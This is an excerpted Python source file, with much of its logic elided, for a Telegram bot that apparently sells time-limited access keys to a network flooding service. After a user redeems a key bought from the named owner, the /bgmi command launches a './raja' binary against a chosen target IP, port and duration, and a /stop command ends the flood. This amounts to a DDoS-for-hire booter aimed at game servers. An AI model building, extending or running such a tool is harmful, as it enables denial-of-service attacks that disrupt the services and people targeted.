...
from RAJA import BOT_TOKEN, ADMIN_IDS,OWNER_USERNAME
    ...
    if user_id in ADMIN_IDS:
        ...
        if len(command) == 2:
            try:
                ...
                response = "Please specify a valid number and unit of time (hours/days) script by @Ninjaytx."
        else:
            response = "Usage: /genkey <amount> <hours/days>"
    else:
        response = "ONLY OWNER CAN USE💀OWNER {@Ninjaytx}..."
...
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if len(command) == 1:
        ...
        if key in keys:
            ...
            del keys[key]
            save_keys()
            response = "✅𝐊𝐄𝐘 𝐑𝐄𝐃𝐄𝐄𝐌 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 OWNER @Ninjaytx"
        else:
            response = "𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐨𝐫 𝐞𝐱𝐩𝐢𝐫𝐞𝐝 𝐤𝐞𝐲 𝐛𝐮𝐲 𝐟𝐫𝐨𝐦 @Ninjaytx"
    else:
...
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ 𝐀𝐜𝐜𝐞𝐬𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝 𝐨𝐫 𝐮𝐧𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐤𝐞𝐲.𝐛𝐮𝐲 𝐤𝐞𝐲 𝐟𝐫𝐨𝐦 @Ninjaytx...")
        return
    ...
    flooding_command = ['./raja', target_ip, port, duration]
...
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if flooding_process is None:
        await update.message.reply_text('No flooding process is running.OWNER {@Ninjaytx}...')
        return
